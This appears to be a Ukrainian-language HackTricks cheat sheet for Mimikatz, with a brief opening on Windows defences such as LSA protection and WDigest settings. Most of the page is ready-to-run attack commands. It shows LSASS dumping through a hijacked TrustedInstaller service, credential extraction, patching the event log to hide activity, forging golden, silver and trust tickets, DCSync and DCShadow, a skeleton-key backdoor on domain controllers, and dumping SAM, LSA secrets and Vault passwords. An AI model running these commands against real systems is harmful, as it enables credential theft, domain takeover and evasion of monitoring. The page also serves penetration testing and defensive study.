# Mimikatz

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Працюєте в **кібербезпецівій компанії**? Хочете, щоб ваша **компанія рекламувалася на HackTricks**? або хочете мати доступ до **останньої версії PEASS або завантажити HackTricks у форматі PDF**? Перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* **Приєднуйтесь до** [**💬**](https://emojipedia.org/speech-balloon/) [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за мною на **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**репозиторію hacktricks**](https://github.com/carlospolop/hacktricks) **та** [**репозиторію hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Ця сторінка базується на одній з [adsecurity.org](https://adsecurity.org/?page\_id=1821)**. Перевірте оригінал для додаткової інформації!

## LM та чіткий текст у пам'яті

Починаючи з Windows 8.1 та Windows Server 2012 R2, були впроваджені значні заходи для захисту від крадіжки облікових даних:

- **Хеші LM та паролі у чіткому тексті** більше не зберігаються в пам'яті для підвищення безпеки. Конкретна настройка реєстру, _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_, повинна бути налаштована зі значенням DWORD `0`, щоб вимкнути аутентифікацію Digest, забезпечуючи, що "чіткі" паролі не кешуються в LSASS.

- Введено **LSA Protection**, щоб захистити процес Local Security Authority (LSA) від несанкціонованого читання пам'яті та впровадження коду. Це досягається шляхом позначення LSASS як захищений процес. Активація захисту LSA включає:
1. Зміну реєстру за адресою _HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ шляхом встановлення `RunAsPPL` на `dword:00000001`.
2. Впровадження об'єкта політики групи (GPO), який забезпечує цю зміну реєстру на керованих пристроях.

Незважаючи на ці заходи захисту, інструменти, такі як Mimikatz, можуть обійти захист LSA за допомогою конкретних драйверів, хоча такі дії ймовірно будуть зафіксовані в журналах подій.

### Протидія вилученню привілеїв SeDebugPrivilege

Зазвичай адміністратори мають привілеї SeDebugPrivilege, що дозволяє їм налагоджувати програми. Ці привілеї можуть бути обмежені, щоб запобігти несанкціонованим витокам пам'яті, загальній техніці, яку використовують зловмисники для вилучення облікових даних з пам'яті. Однак навіть при вилученні цих привілеїв, облікові дані все ще можуть бути вилучені обліковим записом TrustedInstaller за допомогою налаштування спеціалізованої конфігурації служби:
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
Це дозволяє вивантажити пам'ять `lsass.exe` в файл, який потім можна проаналізувати на іншій системі для видобуття облікових даних:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Опції Mimikatz

Підробка журналу подій в Mimikatz включає дві основні дії: очищення журналів подій та патчінг служби Подій для запобігання реєстрації нових подій. Нижче наведені команди для виконання цих дій:

#### Очищення журналів подій

- **Команда**: Ця дія спрямована на видалення журналів подій, ускладнюючи відстеження зловмисних дій.
- Mimikatz не надає прямої команди у своїй стандартній документації для очищення журналів подій безпосередньо через командний рядок. Однак маніпулювання журналами подій зазвичай включає використання системних інструментів або сценаріїв поза межами Mimikatz для очищення конкретних журналів (наприклад, за допомогою PowerShell або Windows Event Viewer).

#### Експериментальна функція: Патчинг служби Подій

- **Команда**: `event::drop`
- Ця експериментальна команда призначена для зміни поведінки служби реєстрації подій, ефективно запобігаючи реєстрації нових подій.
- Приклад: `mimikatz "privilege::debug" "event::drop" exit`

- Команда `privilege::debug` забезпечує, що Mimikatz працює з необхідними привілеями для модифікації системних служб.
- Команда `event::drop` патчить службу реєстрації подій.


### Атаки на квитки Kerberos

### Створення Золотого Квитка

Золотий Квиток дозволяє імітувати доступ на рівні домену. Основна команда та параметри:

- Команда: `kerberos::golden`
- Параметри:
- `/domain`: Назва домену.
- `/sid`: Ідентифікатор безпеки (SID) домену.
- `/user`: Ім'я користувача для імітації.
- `/krbtgt`: Хеш NTLM облікового запису служби KDC домену.
- `/ptt`: Пряме впровадження квитка в пам'ять.
- `/ticket`: Зберігає квиток для подальшого використання.

Приклад:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Створення Срібного Квитка

Срібні квитки надають доступ до конкретних служб. Основна команда та параметри:

- Команда: Схожа на Золотий Квиток, але спрямована на конкретні служби.
- Параметри:
- `/service`: Служба, на яку спрямовано (наприклад, cifs, http).
- Інші параметри схожі на Золотий Квиток.

Приклад:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Створення довірчого квитка

Довірчі квитки використовуються для доступу до ресурсів між доменами за допомогою використання довірчих відносин. Основна команда та параметри:

- Команда: Схожа на Золотий Квиток, але для довірчих відносин.
- Параметри:
- `/target`: Повне доменне ім'я цільового домену.
- `/rc4`: Хеш NTLM для облікового запису довіри.

Приклад:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Додаткові команди Kerberos

- **Виведення квитків**:
- Команда: `kerberos::list`
- Показує всі Kerberos-квитки для поточної сесії користувача.

- **Передача кешу**:
- Команда: `kerberos::ptc`
- Впроваджує Kerberos-квитки з файлів кешу.
- Приклад: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Передача квитка**:
- Команда: `kerberos::ptt`
- Дозволяє використовувати Kerberos-квиток в іншій сесії.
- Приклад: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Очищення квитків**:
- Команда: `kerberos::purge`
- Очищає всі Kerberos-квитки з сесії.
- Корисно перед використанням команд маніпулювання квитками для уникнення конфліктів.


### Втручання в діяльність Active Directory

- **DCShadow**: Тимчасово змушує машину діяти як DC для маніпулювання об'єктами AD.
- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: Імітує DC для запиту даних пароля.
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Отримання облікових даних

- **LSADUMP::LSA**: Витягує облікові дані з LSA.
- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: Імітує DC, використовуючи дані пароля облікового запису комп'ютера.
- *В оригінальному контексті не надано конкретної команди для NetSync.*

- **LSADUMP::SAM**: Доступ до локальної бази даних SAM.
- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: Розшифрування секретів, збережених у реєстрі.
- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: Встановлює новий хеш NTLM для користувача.
- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: Отримання інформації про аутентифікацію довіри.
- `mimikatz "lsadump::trust" exit`

### Різне

- **MISC::Skeleton**: Впровадження задніх дверей в LSASS на DC.
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Підвищення привілеїв

- **PRIVILEGE::Backup**: Отримання прав на резервне копіювання.
- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: Отримання привілеїв налагодження.
- `mimikatz "privilege::debug" exit`

### Отримання облікових даних

- **SEKURLSA::LogonPasswords**: Показує облікові дані для користувачів, які увійшли в систему.
- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: Витягує Kerberos-квитки з пам'яті.
- `mimikatz "sekurlsa::tickets /export" exit`

### Маніпулювання Sid та токеном

- **SID::add/modify**: Зміна SID та SIDHistory.
- Додати: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Змінити: *В оригінальному контексті не надано конкретної команди для зміни.*

- **TOKEN::Elevate**: Імітація токенів.
- `mimikatz "token::elevate /domainadmin" exit`

### Служби терміналу

- **TS::MultiRDP**: Дозволяє кілька сеансів RDP.
- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: Перелік сеансів TS/RDP.
- *В оригінальному контексті не надано конкретної команди для TS::Sessions.*

### Сховище

- Витягнути паролі з Windows Vault.
- `mimikatz "vault::cred /patch" exit`
